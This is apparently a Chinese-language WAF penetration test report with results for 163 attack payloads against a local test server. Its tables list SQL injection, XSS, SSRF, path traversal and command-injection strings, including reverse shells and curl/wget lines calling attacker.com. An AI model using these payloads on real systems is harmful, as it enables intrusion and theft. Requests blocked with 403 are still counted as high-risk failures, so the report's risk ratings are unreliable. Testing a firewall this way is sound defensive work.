# Moat WAF 渗透测试报告

## 基本信息

| 项目 | 详情 |
|------|------|
| 测试目标 | http://localhost:8013 |
| 测试时间 | 2026-06-11 07:47:19 |
| 测试工具 | Python requests |
| 认证Token | `apk_f7e7a5a316f4d59d...` |
| 测试用例总数 | 163 |

## 测试结果概览

| 指标 | 数值 |
|------|------|
| 总测试数 | 163 |
| 被拦截 (Blocked) | 147 |
| 通过/放行 (Passed) | 15 |
| 错误/超时 | 1 |
| 拦截率 | 90.2% |

## 分类测试结果

| 测试类别 | 总数 | 拦截 | 通过 | 错误 | 拦截率 |
|----------|------|------|------|------|--------|
| 认证与授权 | 6 | 0 | 6 | 0 | 0.0% |
| SQL注入 | 20 | 20 | 0 | 0 | 100.0% |
| XSS跨站脚本 | 20 | 20 | 0 | 0 | 100.0% |
| SSRF服务端请求伪造 | 20 | 20 | 0 | 0 | 100.0% |
| 命令注入 | 19 | 19 | 0 | 0 | 100.0% |
| 路径遍历 | 16 | 16 | 0 | 0 | 100.0% |
| HTTP协议攻击 | 14 | 12 | 2 | 0 | 85.7% |
| 敏感文件访问 | 20 | 20 | 0 | 0 | 100.0% |
| 扫描器检测 | 6 | 6 | 0 | 0 | 100.0% |
| 文件上传 | 5 | 4 | 1 | 0 | 80.0% |
| 认证绕过 | 13 | 7 | 6 | 0 | 53.8% |
| DoS资源耗尽 | 4 | 3 | 0 | 1 | 75.0% |

## 详细测试结果

### 认证与授权

| 测试项 | 状态 | HTTP码 | 说明 |
|--------|------|--------|------|
| 无token访问受保护接口 | FAIL | 403 | 应返回401 |
| 无效token访问 | FAIL | 403 | 应返回401 |
| 空Bearer token | FAIL | 403 | 应返回401 |
| Basic Auth代替Bearer | FAIL | 403 | 应返回401 |
| SQL注入绕过认证 | FAIL | 403 | 应返回401 |
| JWT伪造攻击 | FAIL | 403 | 应返回401 |

### SQL注入

| 测试项 | 状态 | HTTP码 | 说明 |
|--------|------|--------|------|
| UNION SELECT注入 | PASS | 403 | payload: ' UNION SELECT username, password FROM users-- |
| 布尔盲注 OR 1=1 | PASS | 403 | payload: ' OR '1'='1'-- |
| 布尔盲注 AND 1=1 | PASS | 403 | payload: ' AND '1'='1'-- |
| 时间盲注 SLEEP | PASS | 403 | payload: '; SELECT SLEEP(5)-- |
| 时间盲注 BENCHMARK | PASS | 403 | payload: ' AND BENCHMARK(5000000,SHA1('test'))-- |
| DROP TABLE注入 | PASS | 403 | payload: '; DROP TABLE users;-- |
| INSERT注入 | PASS | 403 | payload: '; INSERT INTO users VALUES('admin','hacked');-- |
| 堆叠查询 | PASS | 403 | payload: '; SELECT * FROM information_schema.tables;-- |
| 报错注入 EXTRACTVALUE | PASS | 403 | payload: ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version() |
| 报错注入 UPDATEXML | PASS | 403 | payload: ' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)- |
| 十六进制编码绕过 | PASS | 403 | payload: 0x27 UNION SELECT 1,2,3-- |
| 双重编码绕过 | PASS | 403 | payload: %2527 UNION SELECT 1,2,3-- |
| 注释绕过 | PASS | 403 | payload: '/*!UNION*//*!SELECT*/1,2,3-- |
| INFORMATION_SCHEMA | PASS | 403 | payload: ' UNION SELECT table_name FROM information_schema. |
| LOAD_FILE读取 | PASS | 403 | payload: ' UNION SELECT LOAD_FILE('/etc/passwd')-- |
| INTO OUTFILE写入 | PASS | 403 | payload: ' UNION SELECT '<?php system($_GET["cmd"]);?>' INT |
| HAVING注入 | PASS | 403 | payload: ' HAVING 1=1-- |
| GROUP BY注入 | PASS | 403 | payload: ' GROUP BY username HAVING MIN(0)-- |
| pg_sleep时间盲注 | PASS | 403 | payload: '; SELECT pg_sleep(5)-- |
| xp_cmdshell | PASS | 403 | payload: '; EXEC xp_cmdshell('whoami');-- |

### XSS跨站脚本

| 测试项 | 状态 | HTTP码 | 说明 |
|--------|------|--------|------|
| Script标签注入 | PASS | 403 | payload: <script>alert('XSS')</script> |
| IMG onerror | PASS | 403 | payload: <img src=x onerror=alert('XSS')> |
| SVG onload | PASS | 403 | payload: <svg onload=alert('XSS')> |
| 事件处理器 onclick | PASS | 403 | payload: <div onclick=alert('XSS')>click</div> |
| 事件处理器 onmouseover | PASS | 403 | payload: <div onmouseover=alert('XSS')>hover</div> |
| 事件处理器 onfocus | PASS | 403 | payload: <input onfocus=alert('XSS') autofocus> |
| javascript:协议 | PASS | 403 | payload: javascript:alert('XSS') |
| data:text/html | PASS | 403 | payload: data:text/html,<script>alert('XSS')</script> |
| vbscript:协议 | PASS | 403 | payload: vbscript:MsgBox('XSS') |
| eval()调用 | PASS | 403 | payload: eval('alert(1)') |
| document.cookie | PASS | 403 | payload: <script>document.cookie</script> |
| innerHTML注入 | PASS | 403 | payload: <div id='d'></div><script>document.getElementById( |
| document.write注入 | PASS | 403 | payload: <script>document.write('<img src=x onerror=alert(1 |
| Base64编码XSS | PASS | 403 | payload: PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4= |
| iframe注入 | PASS | 403 | payload: <iframe src=javascript:alert('XSS')> |
| Meta refresh注入 | PASS | 403 | payload: <meta http-equiv='refresh' content='0;url=javascri |
| CSS expression | PASS | 403 | payload: <div style='background:expression(alert(1))'> |
| Base标签劫持 | PASS | 403 | payload: <base href='http://evil.com/'> |
| srcdoc注入 | PASS | 403 | payload: <iframe srcdoc='<script>alert(1)</script>'> |
| body onload | PASS | 403 | payload: <body onload=alert('XSS')> |

### SSRF服务端请求伪造

| 测试项 | 状态 | HTTP码 | 说明 |
|--------|------|--------|------|
| 内网地址 127.0.0.1 | PASS | 403 | payload: http://127.0.0.1:80/ |
| 内网地址 localhost | PASS | 403 | payload: http://localhost:80/ |
| 内网地址 10.0.0.1 | PASS | 403 | payload: http://10.0.0.1/ |
| 内网地址 192.168.1.1 | PASS | 403 | payload: http://192.168.1.1/ |
| 内网地址 172.16.0.1 | PASS | 403 | payload: http://172.16.0.1/ |
| 0.0.0.0地址 | PASS | 403 | payload: http://0.0.0.0/ |
| 元数据服务 AWS | PASS | 403 | payload: http://169.254.169.254/latest/meta-data/ |
| 元数据服务 GCP | PASS | 403 | payload: http://metadata.google.internal/ |
| file://协议 | PASS | 403 | payload: file:///etc/passwd |
| dict://协议 | PASS | 403 | payload: dict://127.0.0.1:6379/info |
| gopher://协议 | PASS | 403 | payload: gopher://127.0.0.1:6379/_INFO |
| DNS重绑定 | PASS | 403 | payload: http://rebind.attacker.com/ |
| IPv6内网 | PASS | 403 | payload: http://[::1]/ |
| 十进制IP绕过 | PASS | 403 | payload: http://2130706433/ |
| 八进制IP绕过 | PASS | 403 | payload: http://0177.0.0.1/ |
| 十六进制IP绕过 | PASS | 403 | payload: http://0x7f000001/ |
| URL编码绕过 | PASS | 403 | payload: http://%31%32%37.0.0.1/ |
| HTTP重定向 | PASS | 403 | payload: http://evil.com/redirect?to=http://169.254.169.254 |
| CRLF注入URL | PASS | 403 | payload: http://example.com/%0d%0aHost:169.254.169.254 |
| 内网端口扫描 | PASS | 403 | payload: http://127.0.0.1:3306/ |

### 命令注入

| 测试项 | 状态 | HTTP码 | 说明 |
|--------|------|--------|------|
| 管道符 | | PASS | 403 | payload: test | whoami |
| 分号分隔 ; | PASS | 403 | payload: test; whoami |
| 反引号执行 | PASS | 403 | payload: `whoami` |
| $()命令替换 | PASS | 403 | payload: $(whoami) |
| &&链接执行 | PASS | 403 | payload: test && whoami |
| ||链接执行 | PASS | 403 | payload: test || whoami |
| 换行符注入 | PASS | 403 | payload: test
whoami |
| bash反弹shell | PASS | 403 | payload: bash -i >& /dev/tcp/attacker.com/4444 0>&1 |
| nc反弹shell | PASS | 403 | payload: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 |
| curl外带数据 | PASS | 403 | payload: $(curl http://attacker.com/$(whoami)) |
| wget下载执行 | PASS | 403 | payload: wget http://attacker.com/shell.sh -O /tmp/shell.sh |
| python反弹shell | PASS | 403 | payload: python -c 'import socket,os,pty;s=socket.socket(); |
| perl反弹shell | PASS | 403 | payload: perl -e 'use Socket;$i="attacker.com";$p=4444;sock |
| telnet反弹shell | PASS | 403 | payload: TF=$(mktemp -u);mkfifo $TF && telnet attacker.com  |
| awk命令执行 | PASS | 403 | payload: awk 'BEGIN {system("whoami")}' |
| find命令执行 | PASS | 403 | payload: find / -exec whoami \; |
| xargs命令执行 | PASS | 403 | payload: echo 'whoami' | xargs -I {} sh -c {} |
| eval命令执行 | PASS | 403 | payload: eval 'whoami' |
| env命令利用 | PASS | 403 | payload: env /bin/sh -c 'whoami' |

### 路径遍历

| 测试项 | 状态 | HTTP码 | 说明 |
|--------|------|--------|------|
| 基本 ../遍历 | PASS | 403 | payload: ../../../etc/passwd |
| 双层编码遍历 | PASS | 403 | payload: ..%252f..%252f..%252fetc/passwd |
| URL编码遍历 | PASS | 403 | payload: ..%2f..%2f..%2fetc/passwd |
| Windows遍历 | PASS | 403 | payload: ..\..\..\windows\system32\config\sam |
| Windows编码遍历 | PASS | 403 | payload: ..%5c..%5c..%5cwindows\system32\config\sam |
| 空字节截断 | PASS | 403 | payload: ../../../etc/passwd%00 |
| /etc/passwd绝对路径 | PASS | 403 | payload: /etc/passwd |
| file://协议读取 | PASS | 403 | payload: file:///etc/passwd |
| /proc/self/environ | PASS | 403 | payload: /proc/self/environ |
| /proc/self/cmdline | PASS | 403 | payload: /proc/self/cmdline |
| WEB-INF/web.xml | PASS | 403 | payload: /WEB-INF/web.xml |
| PHP伪协议 | PASS | 403 | payload: php://filter/convert.base64-encode/resource=/etc/p |
| 双重URL编码 | PASS | 403 | payload: %252e%252e%252fetc/passwd |
| Unicode编码绕过 | PASS | 403 | payload: ..%c0%af..%c0%af..%c0%afetc/passwd |
| UTF-8超长编码 | PASS | 403 | payload: ..%e0%80%af..%e0%80%afetc/passwd |
| Nginx路径穿越 | PASS | 403 | payload: /static/../../../etc/passwd |

### HTTP协议攻击

| 测试项 | 状态 | HTTP码 | 说明 |
|--------|------|--------|------|
| CRLF注入 URI | PASS | 403 | payload: /v1/account%0d%0aInjected-Header: evil |
| CRLF注入 参数 | PASS | 403 | payload: test%0d%0aInjected: evil |
| CRLF注入 Set-Cookie | PASS | 403 | payload: %0d%0aSet-Cookie: session=hijacked |
| HTTP TRACE方法 | WARN | 405 | 应拒绝不安全的HTTP方法 |
| HTTP CONNECT方法 | WARN | 405 | 应拒绝不安全的HTTP方法 |
| HTTP OPTIONS方法 | PASS | 403 | 应拒绝不安全的HTTP方法 |
| HTTP DELETE方法 | PASS | 403 | 应拒绝不安全的HTTP方法 |
| HTTP PUT方法 | PASS | 403 | 应拒绝不安全的HTTP方法 |
| HTTP PATCH方法 | PASS | 403 | 应拒绝不安全的HTTP方法 |
| 超大请求头攻击 | PASS | 400 | 应拒绝超大请求头 |
| Host头注入 | PASS | 403 | 应拒绝异常Host头 |
| X-Forwarded-For伪造 | PASS | 403 | 应验证代理头 |
| CL/TE请求走私 | PASS | 400 | 应检测请求走私 |
| 双Content-Length头 | PASS | 403 | 应拒绝双Content-Length |

### 敏感文件访问

| 测试项 | 状态 | HTTP码 | 说明 |
|--------|------|--------|------|
| Linux密码文件: /etc/passwd | PASS | 403 | 应阻止访问敏感文件 |
| Linux影子密码: /etc/shadow | PASS | 403 | 应阻止访问敏感文件 |
| 环境配置文件: /.env | PASS | 403 | 应阻止访问敏感文件 |
| 配置文件: /config.json | PASS | 403 | 应阻止访问敏感文件 |
| Git配置: /.git/config | PASS | 403 | 应阻止访问敏感文件 |
| Git HEAD: /.git/HEAD | PASS | 403 | 应阻止访问敏感文件 |
| SVN配置: /.svn/entries | PASS | 403 | 应阻止访问敏感文件 |
| Apache配置: /.htaccess | PASS | 403 | 应阻止访问敏感文件 |
| Apache密码: /.htpasswd | PASS | 403 | 应阻止访问敏感文件 |
| IIS配置: /web.config | PASS | 403 | 应阻止访问敏感文件 |
| WordPress配置: /wp-config.php | PASS | 403 | 应阻止访问敏感文件 |
| PHP信息泄露: /phpinfo.php | PASS | 403 | 应阻止访问敏感文件 |
| Apache状态: /server-status | PASS | 403 | 应阻止访问敏感文件 |
| Apache信息: /server-info | PASS | 403 | 应阻止访问敏感文件 |
| macOS目录缓存: /.DS_Store | PASS | 403 | 应阻止访问敏感文件 |
| Windows缩略图: /Thumbs.db | PASS | 403 | 应阻止访问敏感文件 |
| 数据库备份: /backup.sql | PASS | 403 | 应阻止访问敏感文件 |
| 数据库导出: /dump.sql | PASS | 403 | 应阻止访问敏感文件 |
| 调试日志: /debug.log | PASS | 403 | 应阻止访问敏感文件 |
| Bash历史: /.bash_history | PASS | 403 | 应阻止访问敏感文件 |

### 扫描器检测

| 测试项 | 状态 | HTTP码 | 说明 |
|--------|------|--------|------|
| 扫描器UA: sqlmap | PASS | 403 | User-Agent: sqlmap/1.0 |
| 扫描器UA: Nikto | PASS | 403 | User-Agent: Nikto/2.1.5 |
| 扫描器UA: Nmap | PASS | 403 | User-Agent: Nmap Scripting Engine |
| 扫描器UA: Baiduspider | PASS | 403 | User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0) |
| 扫描器UA: Python requests | PASS | 403 | User-Agent: python-requests/2.28.0 |
| 扫描器UA: curl | PASS | 403 | User-Agent: curl/7.68.0 |

### 文件上传

| 测试项 | 状态 | HTTP码 | 说明 |
|--------|------|--------|------|
| PHP WebShell上传 | PASS | 403 | 应阻止WebShell |
| 双扩展名绕过 (.php.jpg) | PASS | 403 | 应检测双扩展名 |
| JSP WebShell上传 | PASS | 403 | 应阻止JSP WebShell |
| 超大文件上传 (11MB) | WARN | 413 | 应拒绝超大文件 |
| SVG XSS文件上传 | PASS | 403 | 应阻止SVG XSS |

### 认证绕过

| 测试项 | 状态 | HTTP码 | 说明 |
|--------|------|--------|------|
| 路径遍历绕过 /admin | FAIL | 403 | path: /admin/../v1/account |
| 双斜杠绕过 | FAIL | 403 | path: //v1/account |
| 分号绕过 | FAIL | 403 | path: /v1/account; |
| URL编码绕过 | FAIL | 403 | path: /v1/%61ccount |
| 大小写绕过 | FAIL | 403 | path: /V1/ACCOUNT |
| 参数污染 | FAIL | 403 | path: /v1/account?plan_type=pro |
| 管理接口探测: /admin | PASS | 403 | 应拒绝未授权访问管理接口 |
| 管理接口探测: /admin/ | PASS | 503 | 应拒绝未授权访问管理接口 |
| 管理接口探测: /admin/login | PASS | 503 | 应拒绝未授权访问管理接口 |
| 管理接口探测: /api/admin | PASS | 403 | 应拒绝未授权访问管理接口 |
| 管理接口探测: /management | PASS | 403 | 应拒绝未授权访问管理接口 |
| 管理接口探测: /dashboard | PASS | 403 | 应拒绝未授权访问管理接口 |
| 管理接口探测: /internal | PASS | 403 | 应拒绝未授权访问管理接口 |

### DoS资源耗尽

| 测试项 | 状态 | HTTP码 | 说明 |
|--------|------|--------|------|
| ReDoS正则攻击 | PASS | 403 | 应限制输入长度 |
| JSON深度嵌套攻击 | PASS | 403 | 应限制JSON深度 |
| 速率限制测试 | UNEXP | 403 | 20次快速请求未触发限流(可能已有限流) |
| Unicode空字节攻击 | PASS | 403 | 应处理空字节 |

## 安全风险评估

### 风险等级定义

| 等级 | 说明 |
|------|------|
| 严重 (Critical) | 可导致远程代码执行、数据泄露、系统沦陷 |
| 高危 (High) | 可导致认证绕过、权限提升、敏感信息泄露 |
| 中危 (Medium) | 可导致信息泄露、服务降级 |
| 低危 (Low) | 安全最佳实践违反 |

### 高危风险 (12项)

- 认证与授权: 无token访问受保护接口
- 认证与授权: 无效token访问
- 认证与授权: 空Bearer token
- 认证与授权: Basic Auth代替Bearer
- 认证与授权: SQL注入绕过认证
- 认证与授权: JWT伪造攻击
- 认证绕过: 路径遍历绕过 /admin
- 认证绕过: 双斜杠绕过
- 认证绕过: 分号绕过
- 认证绕过: URL编码绕过
- 认证绕过: 大小写绕过
- 认证绕过: 参数污染

### 中危风险 (3项)

- HTTP协议攻击: HTTP TRACE方法
- HTTP协议攻击: HTTP CONNECT方法
- 文件上传: 超大文件上传 (11MB)

## WAF规则覆盖分析

基于Moat WAF规则库的静态分析：

| 攻击类型 | 规则数 | 覆盖率 | 说明 |
|----------|--------|--------|------|
| SQL注入 | 38 | 高 | 覆盖UNION、布尔盲注、时间盲注、报错注入等 |
| XSS | 36 | 高 | 覆盖反射型、存储型、DOM型、事件处理器等 |
| SSRF | 34 | 高 | 覆盖内网地址、元数据服务、协议滥用等 |
| 命令注入 | 28 | 高 | 覆盖管道符、命令替换、反弹Shell等 |
| 路径遍历 | 25 | 高 | 覆盖../遍历、编码绕过、协议读取等 |
| 协议攻击 | 16 | 中 | 覆盖CRLF注入、请求走私、方法滥用等 |
| 敏感文件 | 20 | 高 | 覆盖常见敏感文件路径和备份文件 |
| 扫描器检测 | 22 | 高 | 覆盖常见安全工具UA标识 |

## 测试结论

### 拦截能力评估

本次渗透测试共执行 **163** 个测试用例，覆盖 **12** 个安全类别。

- **拦截成功率**: 90.2%
- **严重漏洞**: 0个
- **高危漏洞**: 12个
- **中危漏洞**: 3个

### 建议

1. **立即修复**: 所有严重和高危风险项需在上线前修复
2. **规则优化**: 对未拦截的攻击向量补充WAF规则
3. **纵深防御**: 结合华为云WAF形成多层防护
4. **定期测试**: 每月进行一次渗透测试，持续改进安全防护
5. **日志监控**: 启用实时告警，对高危攻击及时响应

---

*报告生成时间: 2026-06-11 07:47:19*
*测试工具: Moat WAF Penetration Test Suite v1.0*
